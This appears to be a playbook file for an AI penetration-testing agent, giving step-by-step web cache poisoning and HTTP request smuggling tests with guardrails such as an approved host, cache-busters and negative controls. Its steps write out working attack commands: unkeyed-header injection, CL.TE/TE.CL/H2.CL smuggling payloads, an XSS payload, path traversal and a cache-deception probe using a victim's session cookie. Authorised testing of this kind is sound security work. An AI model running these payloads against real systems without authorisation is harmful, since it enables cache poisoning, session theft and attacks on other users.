---
name: harness-cache-poison
description: "Test web cache poisoning and HTTP request smuggling: unkeyed headers, cache key manipulation, CL.TE/TE.CL desync, and response queue poisoning."
---

# Cache poisoning & request smuggling — desync, unkeyed, queue

Source: `web-cache-poisoning`, `http-request-smuggling` (2024: H2.CL smuggling, cache key normalization, unkeyed query params, response queue poisoning).

## Gate

Approved `host` only. Every command via `cyber_process` `argv`. One probe per request. Never poison a cache shared with production users — use cache-buster query params for every probe. → `harness-vuln-triage` before `cyber_finding`.

## Steps

### 1. Cache detection — positive control

```
cyber_process argv=["curl","-sS","-D","-","<url>/?cb=BASELINE-001"]
```

Record `X-Cache`, `CF-Cache-Status`, `Age`, `X-Cache-Hits`, `Vary`, `Server`. Send the same request again:

```
cyber_process argv=["curl","-sS","-D","-","<url>/?cb=BASELINE-001"]
```

If the second response shows `X-Cache: HIT`, `Age > 0`, or `CF-Cache-Status: HIT` → cache confirmed. Record the CDN fingerprint (Cloudflare, Akamai, Fastly, CloudFront, Varnish). Hash both responses.

### 2. Unkeyed input discovery

For each probe, use a unique cache-buster. Inject the header, then request without it:

```
cyber_process argv=["curl","-sS","-D","-","-H","X-Forwarded-Host: canary-xfh.evil.example","<url>/?cb=XFH-001"]
```

```
cyber_process argv=["curl","-sS","<url>/?cb=XFH-001"]
```

If the second response (no injected header) reflects `canary-xfh.evil.example` in a `<link>`, `<script src>`, or `Location` → cache poisoned via unkeyed `X-Forwarded-Host`.

Repeat for each vector:

```
cyber_process argv=["curl","-sS","-D","-","-H","X-Forwarded-Scheme: nothttps","<url>/?cb=XFS-001"]
cyber_process argv=["curl","-sS","-D","-","-H","X-Original-URL: /admin","<url>/?cb=XOU-001"]
cyber_process argv=["curl","-sS","-D","-","-H","X-Forwarded-Port: 1337","<url>/?cb=XFP-001"]
```

Then fetch each `?cb=` without the header to check cached reflection.

| Vector | Inject | Reflected where | Impact |
|---|---|---|---|
| `X-Forwarded-Host` | `evil.example` | `<link>`, `<script src>`, redirect | XSS via poisoned script import |
| `X-Forwarded-Scheme` | `nothttps` | redirect `Location` | redirect loop / downgrade |
| `X-Original-URL` | `/admin` | path override | access control bypass |
| `X-Forwarded-Port` | `1337` | URL generation | broken links / open redirect |
| Unkeyed query param | `utm_content=<img+onerror=alert(1)>` | body | stored XSS via cache |

### 3. Cache key normalization probes

```
cyber_process argv=["curl","-sS","-D","-","<url>/api/..%2fadmin"]
cyber_process argv=["curl","-sS","-D","-","<url>/api/../admin"]
```

If both return the same resource but only one is cached → normalization gap. Also test:

```
cyber_process argv=["curl","-sS","-D","-","<url>/Admin"]
cyber_process argv=["curl","-sS","-D","-","<url>/%61dmin"]
```

Compare status, body, and cache headers across variants.

### 4. HTTP request smuggling — CL.TE detection

Use a time-based probe. If the front-end uses `Content-Length` and the back-end uses `Transfer-Encoding`, a smuggled partial request causes the next request to stall:

```
cyber_process argv=["curl","-sS","-D","-","--http1.1","-X","POST","-H","Content-Length: 6","-H","Transfer-Encoding: chunked","-d","0\r\n\r\nG","<url>/"]
```

Immediately send a normal request:

```
cyber_process argv=["curl","-sS","-D","-","-o","/dev/null","-w","time:%{time_total} status:%{http_code}","<url>/"]
```

If the follow-up stalls (>5s) or returns an unexpected status → CL.TE desync candidate. Three samples confirm timing-based detection.

For TE.CL, reverse the conflict:

```
cyber_process argv=["curl","-sS","-D","-","--http1.1","-X","POST","-H","Content-Length: 3","-H","Transfer-Encoding: chunked","-d","8\r\nSMUGGLED\r\n0\r\n\r\n","<url>/"]
```

For H2.CL (HTTP/2 front-end), use `h2csmuggler` or raw `nghttp`:

```
cyber_process argv=["python3","-m","h2csmuggler","-x","<url>/","--smuggle","GET /admin HTTP/1.1\r\nHost: <host>\r\n\r\n"]
```

### 5. Response queue poisoning — canary proof

If smuggling is confirmed, inject a request that reflects a unique canary:

```
cyber_process argv=["curl","-sS","-D","-","--http1.1","-X","POST","-H","Content-Length: <calculated>","-H","Transfer-Encoding: chunked","-d","0\r\n\r\nGET /canary-UNIQUE-ID HTTP/1.1\r\nHost: <host>\r\nFoo: bar","<url>/"]
```

Then send a normal request. If the response contains `/canary-UNIQUE-ID` or a 404 for that path → the smuggled request was processed by the back-end and its response was served to the next client.

### 6. Cache deception

Trick the cache into storing a private page under a public-looking path:

```
cyber_process argv=["curl","-sS","-D","-","-H","Cookie: <victim-session>","<url>/account/settings/nonexistent.css"]
```

```
cyber_process argv=["curl","-sS","-D","-","<url>/account/settings/nonexistent.css"]
```

If the second (unauthenticated) request returns the victim's settings HTML → cache deception confirmed.

### 7. Negative controls

| Control | Probe | Expected |
|---|---|---|
| Normal cache | same `?cb=` twice, no injection | `HIT` on second, no foreign content |
| Non-reflected header | `X-Custom-Nothing: test` | not reflected, cache clean |
| Keyed input | `Vary: Accept-Language` present | different `Accept-Language` → different cache entry |
| Well-formed request | normal POST | no desync on follow-up |

### Stop

Production-shared caches, sustained smuggling, payload that modifies server state.

### Evidence ids

Keep cache-baseline, each unkeyed-header probe (inject + verify), normalization probes, smuggling timing samples (3 each), queue-poisoning canary, deception probe, and all controls as separate observations. Record `X-Cache`, `Age`, `CF-Cache-Status`, body hash.

## Verification scenarios

| Scenario | Observation | Expected classification |
|---|---|---|
| `X-Forwarded-Host` reflected in cached response without header | body contains `evil.example` on clean fetch | cache poisoning candidate |
| `X-Forwarded-Host` not reflected | clean response | negative control confirmed |
| CL.TE follow-up stalls >5s, 3 samples | consistent timing | CL.TE smuggling candidate |
| CL.TE follow-up returns immediately | normal timing | no desync |
| Deception: unauthenticated fetch returns victim HTML | private fields in body | cache deception candidate |
| Deception: unauthenticated fetch returns 404 | no private data | negative control confirmed |
| Smuggled canary appears in next response | canary path in body | queue poisoning candidate |
| Unkeyed `utm_content` with script tag cached | `<img onerror=` in clean fetch | stored XSS via cache |

A reflected unkeyed header is a lead. The finding is the **cached** reflection served to a second, clean request.

## Done

`cyber_finding` cites the CDN, the unkeyed input or desync technique, the cached proof (inject → clean fetch), and all controls. Untested vectors stay `not-tested`.
